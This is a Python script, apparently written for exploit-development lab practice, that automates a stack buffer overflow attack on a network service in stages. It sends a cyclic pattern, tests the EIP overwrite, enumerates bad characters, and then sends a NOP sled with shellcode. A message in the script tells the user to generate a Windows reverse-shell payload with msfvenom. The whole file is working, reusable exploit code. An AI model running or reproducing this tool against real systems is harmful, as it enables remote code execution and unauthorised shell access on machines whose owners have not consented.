#!/usr/bin/env python3

import socket
import options


def send_pattern(ip, port):
    """For Stage 2: Locating offset"""

    if options.pattern is None or len(options.pattern) == 0:
        print("[!] Pattern not found")
        print("[!] Please create one using \"msf-pattern_create -l $n\" and place it under options.py")
        print("[!] Aborting...")
        exit()

    data = options.prefix + options.pattern + options.postfix

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        try:
            sock.connect((ip, port))

            print(f"[*] Sending pattern of length {len(options.pattern)}")
            sock.send(bytes(data + "\r\n", "latin-1"))
            print("[*] Completed")

            print(f"[i] Please run \"!mona findmsp -distance {len(options.pattern)}\" in Immunity")
            print("[i] Then look for the offset in \"EIP: contains normal pattern: ... (offset XXX)\"")

        except Exception as e:
            print("[!] Error when sending pattern")
            print(f"[!] Exception: {e}")
            exit()


def test_eip(ip, port):
    """For Stage 3: Testing EIP overwrite"""

    print(f"[*] Using offset {options.offset}")
    print("[*] Using default return address \"BBBB\"")

    buf = "A" * options.offset
    retn = "BBBB"
    data = options.prefix + buf + retn + options.postfix

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        try:
            sock.connect((ip, port))

            print("[*] Sending buffer")
            sock.send(bytes(data + "\r\n", "latin-1"))
            print("[*] Completed")

            print("[i] Please confirm in debugger that EIP is \"42424242\"")
            print("[i] Remember to run '!mona bytearray -b \"\\x00\"' before starting the next stage")

        except Exception as e:
            print("[!] Error when sending buffer")
            print(f"[!] Exception: {e}")
            exit()


def _filter_bad_chars():
    """Private helper function to replace bad characters"""
    out = "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

    for char in options.bad_chars:
        out = out.replace(char, "")

    return out


def send_char_list(ip, port):
    """For Stage 4: Identifying Bad Characters"""

    print(f"[*] Filtering bad characters {options.bad_chars.encode('utf-8').hex()} from fuzz payload")

    buf = "A" * options.offset
    retn = "BBBB"
    load = _filter_bad_chars()
    data = options.prefix + buf + retn + load + options.postfix

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        try:
            sock.connect((ip, port))

            print("[*] Sending characters list")
            sock.send(bytes(data + "\r\n", "latin-1"))
            print("[*] Completed")

            print("[i] Please take note of the ESP register in the debugger")
            print("[i] And then run \"!mona compare -f path\\to\\bytearray.bin -a $ESP\" in Immunity")
            print("[i] And then update options.py with the bad characters identified")
            print("[i] And then generate another bytearray with mona")
            print("[i] Repeat until there is no longer any bad characters")

        except Exception as e:
            print("[!] Error when sending characters list")
            print(f"[!] Exception: {e}")
            exit()


def exploit(ip, port):
    """For Stage 5: Exploitation"""

    if options.retn is None or len(options.retn) == 0:
        print("[!] Return address not specified")
        print("[!] Please locate one using '!mona jmp -r esp -cpb \"\\x00...\"'")
        print("[!] Aborting...")
        exit()

    if options.payload is None or len(options.payload) == 0:
        print("[!] Payload not provided")
        print("[!] Please generate one with 'msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=80 EXITFUNC=thread -b \"\\x00...\" -f c'")
        print("[!] Aborting...")
        exit()

    buf = "A" * options.offset
    padding = "\x90" * options.padding_amount
    data = options.prefix + buf + options.retn + padding + options.payload + options.postfix

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        try:
            sock.connect((ip, port))

            print("[*] Sending full exploit payload")
            sock.send(bytes(data + "\r\n", "latin-1"))
            print("[*] Completed")

        except Exception as e:
            print("[!] Error when sending exploit payload")
            print(f"[!] Exception: {e}")
            exit()
